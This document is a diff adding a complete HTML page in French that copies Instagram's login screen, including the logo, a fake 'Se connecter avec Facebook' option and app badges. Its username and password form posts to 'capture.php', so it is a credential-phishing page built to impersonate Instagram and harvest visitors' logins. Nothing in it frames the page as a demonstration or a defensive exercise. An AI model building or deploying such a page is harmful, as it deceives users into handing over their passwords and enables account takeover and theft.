@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            background-color: #fafafa;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 350px;
+            margin: 60px auto;
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 10px 40px;
+        }
+        .logo {
+            margin: 30px 0;
+            text-align: center;
+        }
+        .logo img {
+            width: 175px;
+        }
+        .form-group {
+            margin-bottom: 6px;
+        }
+        input {
+            width: 100%;
+            padding: 9px 0 7px 8px;
+            border: 1px solid #efefef;
+            border-radius: 3px;
+            background-color: #fafafa;
+            font-size: 14px;
+        }
+        button {
+            width: 100%;
+            background-color: #3897f0;
+            border: 1px solid #3897f0;
+            border-radius: 3px;
+            color: white;
+            padding: 8px;
+            font-weight: bold;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+        .divider {
+            display: flex;
+            margin: 15px 0;
+        }
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+            margin: auto;
+        }
+        .divider span {
+            color: #999;
+            font-size: 13px;
+            padding: 0 20px;
+        }
+        .facebook-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 15px;
+            color: #385185;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        .facebook-login img {
+            width: 16px;
+            margin-right: 8px;
+        }
+        .password-reset {
+            text-align: center;
+            font-size: 12px;
+            margin-top: 15px;
+            color: #00376b;
+        }
+        .signup {
+            text-align: center;
+            padding: 20px;
+            font-size: 14px;
+            color: #262626;
+        }
+        .signup a {
+            color: #3897f0;
+            font-weight: bold;
+            text-decoration: none;
+        }
+        .apps {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #262626;
+        }
+        .app-downloads {
+            display: flex;
+            justify-content: center;
+            margin-top: 15px;
+        }
+        .app-downloads img {
+            width: 135px;
+            height: 40px;
+            margin: 0 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/800px-Instagram_logo_2022.svg.png" alt="Instagram" width="175">
+        </div>
+        <form id="loginForm" action="capture.php" method="post">
+            <div class="form-group">
+                <input type="text" name="username" placeholder="Nom d'utilisateur, email ou téléphone">
+            </div>
+            <div class="form-group">
+                <input type="password" name="password" placeholder="Mot de passe">
+            </div>
+            <button type="submit">Connexion</button>
+        </form>
+        <div class="divider">
+            <span>OU</span>
+        </div>
+        <div class="facebook-login">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/1200px-Facebook_f_logo_%282019%29.svg.png" alt="Facebook" width="16">
+            <span>Se connecter avec Facebook</span>
+        </div>
+        <div class="password-reset">
+            <a href="#">Mot de passe oublié ?</a>
+        </div>
+    </div>
+    <div class="container">
+        <div class="signup">
+            Pas de compte ? <a href="#">Inscrivez-vous</a>
+        </div>
+    </div>
+    <div class="apps">
+        <p>Téléchargez l'application.</p>
+        <div class="app-downloads">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Download_on_the_App_Store_Badge.svg/1200px-Download_on_the_App_Store_Badge.svg.png" alt="App Store">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/1200px-Google_Play_Store_badge_EN.svg.png" alt="Google Play">
+        </div>
+    </div>
+</body>
+</html>
